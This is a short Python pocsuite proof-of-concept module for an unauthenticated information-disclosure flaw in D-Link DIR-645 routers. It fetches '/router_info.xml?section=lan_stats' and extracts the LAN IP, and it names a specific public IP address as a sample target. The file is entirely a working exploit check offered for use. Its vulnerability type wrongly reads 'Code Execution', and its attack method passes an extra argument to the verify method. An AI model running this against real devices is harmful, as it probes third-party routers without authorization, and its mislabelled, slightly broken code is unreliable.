#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "D-Link DIR-645 info disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Code Execution'
    version = '1.0'  # default version: 1.0
    references = ''
    desc = 'Module exploits D-Link DIR-645 info disclosure'


    vulDate = ''
    createDate = '2017-10-16'
    updateDate = '2017-10-16'

    appName = 'D-Link'
    appVersion = 'DIR-645 v1.02,DIR-645 v1.01'
    dork = ''
    appPowerLink = 'http://www.dlink.com'
    samples = ['http://84.238.140.25:8080']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}

        url = self.url + '/router_info.xml?section=lan_stats'
        resp = req.get(url)
        if resp.content:
            lan_ip = re.search("<lan_ip>(.+?)</lan_ip>", resp.content)
        if resp.status_code == 200 and lan_ip:
            result['VerifyInfo'] = {}
            result['VerifyInfo'][' URL'] = lan_ip.group(1)


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
